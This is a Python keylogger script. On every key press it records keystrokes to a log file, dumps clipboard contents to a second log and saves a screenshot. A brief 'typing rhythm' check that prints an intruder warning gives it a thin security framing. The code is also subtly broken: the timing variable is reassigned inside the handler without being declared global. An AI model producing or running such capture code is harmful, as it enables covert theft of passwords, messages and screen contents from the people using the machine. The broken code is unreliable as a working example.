import os
import time
import datetime
import pyautogui
import clipboard
import pynput
from pynput.keyboard import Key, Listener
from pynput.mouse import Controller

# Set up logging
log_dir = "/path/to/log/directory"
log_filename = "keylogger-" + datetime.datetime.now().strftime("%Y-%m-%d-%H%M%S") + ".txt"
log_file = open(os.path.join(log_dir, log_filename), "w")

# Set up clipboard logging
clipboard_log = "/path/to/clipboard/log/directory/clipboard.log"
clipboard_log_file = open(clipboard_log, "a")

# Set up screenshot directory
screenshot_dir = "/path/to/screenshot/directory"

# Set up mouse controller
mouse = Controller()

# Set up typing rhythm detection
typing_rhythm_threshold = 0.15
keystroke_times = []
last_keystroke_time = time.time()

def on_press(key):
    # Log the keystroke
    try:
        log_file.write(str(key.char))
    except AttributeError:
        log_file.write("{0}".format(key))

    # Log the clipboard content
    clipboard_content = clipboard.paste()
    clipboard_log_file.write(str(time.time()) + " " + clipboard_content + "\n")

    # Take a screenshot
    screenshot = pyautogui.screenshot()
    screenshot.save(os.path.join(screenshot_dir, "screenshot-" + datetime.datetime.now().strftime("%Y-%m-%d-%H%M%S") + ".png"))

    # Add the keystroke time to the list
    keystroke_times.append(time.time() - last_keystroke_time)

    # Calculate the average typing rhythm
    if len(keystroke_times) > 10:
        keystroke_times.pop(0)
        avg_rhythm = sum(keystroke_times) / len(keystroke_times)

        # Calculate the standard deviation of the typing rhythm
        rhythm_squares = [(x - avg_rhythm) ** 2 for x in keystroke_times]
        rhythm_stddev = (sum(rhythm_squares) / len(keystroke_times)) ** 0.5

        # Check if the user's typing rhythm has changed significantly
        if abs(avg_rhythm - typing_rhythm_threshold) > rhythm_stddev:
            print("Warning: Possible intruder detected.")

    last_keystroke_time = time.time()

def on_release(key):
    pass

# Start the keylogger
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# Close the log files
log_file.close()
clipboard_log_file.close()
